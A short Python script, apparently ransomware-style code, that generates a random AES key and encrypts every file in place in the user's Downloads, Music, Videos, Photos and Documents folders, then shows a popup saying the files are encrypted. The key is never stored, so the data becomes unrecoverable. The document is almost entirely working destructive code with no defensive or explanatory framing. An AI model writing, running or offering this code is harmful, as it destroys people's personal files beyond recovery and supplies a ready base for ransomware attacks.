# Import necessary libraries
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import tkinter as tk
from tkinter import messagebox

# Function to encrypt a file
def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    with open(file_path, 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)

# Function to encrypt files in a directory
def encrypt_directory(directory, key):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

# Main function
def main():
    key = get_random_bytes(16)  # Generate a random key
    directories = [os.path.expanduser("~/Downloads"), 
                   os.path.expanduser("~/Music"), 
                   os.path.expanduser("~/Videos"), 
                   os.path.expanduser("~/Photos"), 
                   os.path.expanduser("~/Documents")]
    
    for directory in directories:
        encrypt_directory(directory, key)

    # Show message box
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("Encryption Complete", "Your files are encrypted.")

if __name__ == "__main__":
    main()
